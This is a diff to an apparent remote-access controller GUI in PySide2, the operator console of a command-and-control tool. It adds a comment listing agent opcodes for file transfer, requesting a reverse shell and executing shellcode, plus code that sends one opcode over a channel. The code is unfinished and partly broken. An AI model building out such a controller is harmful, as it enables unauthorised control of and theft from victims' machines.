@@ -12,6 +12,14 @@ from PySide2 import QtCore, QtGui, QtWidgets, QtMultimedia, QtMultimediaWidgets
 # https://doc.qt.io/qtforpython/?hsCtaTracking=fab9e910-0b90-4caa-b6d0-e202692b6f13%7Cb9e0be8d-1d85-4644-aaa2-41de4e6d37e3
 # https://matplotlib.org/gallery/user_interfaces/embedding_in_qt_sgskip.html#sphx-glr-gallery-user-interfaces-embedding-in-qt-sgskip-py
 
+
+class File():
+    def __init__(self, filename, size, data):
+        self.filename = filename
+        self.filesize = size
+        self.data = data
+        
+
 class Connect(QtWidgets.QDialog):
     def __init__(self):
         QtWidgets.QDialog.__init__(self)
@@ -65,7 +73,7 @@ class Connect(QtWidgets.QDialog):
         self.initLayout.addLayout(self.connectLayout, 2, 0)
         
         
-        self.setWindowTitle("Hunter Management Console")
+        self.setWindowTitle("Management Console")
 
         self.setLayout(self.initLayout)
         
@@ -89,9 +97,9 @@ class Connect(QtWidgets.QDialog):
                 # To read from channel:
                 #   recv(self, nbytes)
                 # To write to channel:
-                #   send(self, s)
+                #   sendall(self, s)
 
-                channel.
+                
 
                 
             except ValueError:
@@ -107,7 +115,7 @@ class Connect(QtWidgets.QDialog):
 
 
             print("[+] Successfully connected!")
-            self.manager = Manager("example")
+            self.manager = Manager(channel)
             self.hide()
             self.manager.show()
 
@@ -116,7 +124,7 @@ class Connect(QtWidgets.QDialog):
 class Manager(QtWidgets.QWidget):
     def __init__(self, socket):
         QtWidgets.QWidget.__init__(self)
-        self.socket = socket
+        self.channel = channel
         
         #self.text.setAlignment(Qt.AlignCenter)
 
@@ -148,6 +156,7 @@ class Manager(QtWidgets.QWidget):
 
         self.color = paletteColors.Colors()
         self.setPalette(self.color.pltActive)
+        self.connected = True
 	
 
 
@@ -211,7 +220,7 @@ class Manager(QtWidgets.QWidget):
         self.controlLayout.addLayout(self.leftMenuLayout, 1, 0)
         self.controlLayout.addLayout(self.mainDiagLayout, 1, 1)
 
-        self.setWindowTitle("Hunter Management Console")
+        self.setWindowTitle("Management Console")
 
         self.setLayout(self.controlLayout)
 
@@ -231,7 +240,7 @@ class Manager(QtWidgets.QWidget):
         if not self.has_selection():
             return
             
-        print("[i] Shelling target \"%s\"..." % self.main.currentItem().text())
+        print("[i] Getting shell from target \"%s\"..." % self.main.currentItem().text())
 
     def getInfo(self):
         if not self.has_selection():
@@ -248,6 +257,16 @@ class Manager(QtWidgets.QWidget):
             return
 
         print("[i] Uploading file to target...")
+
+        # Commands here are the same for agents 
+        # So 10 -> Download file from server (but has info regarding agent too)
+        # 11 -> Request reverse shell from agent
+        # 12 -> Upload file to server (with agent info)
+        # 13 -> agent exec shell code
+        # 14 -> agent exec module
+        # 0 -> exit connection
+
+        self.channel.sendall("10")
 
     def download(self):
         if not self.has_selection():
@@ -286,7 +305,7 @@ class Manager(QtWidgets.QWidget):
 
     def openFile(self):
         obj = QtWidgets.QFileDialog()
-        obj.setPalette(self.pltActive)
+        obj.setPalette(self.color.pltActive)
         filepath, filterStr = obj.getOpenFileName(self, "Select file", "", "All Files (*)")
         
         if not filepath:
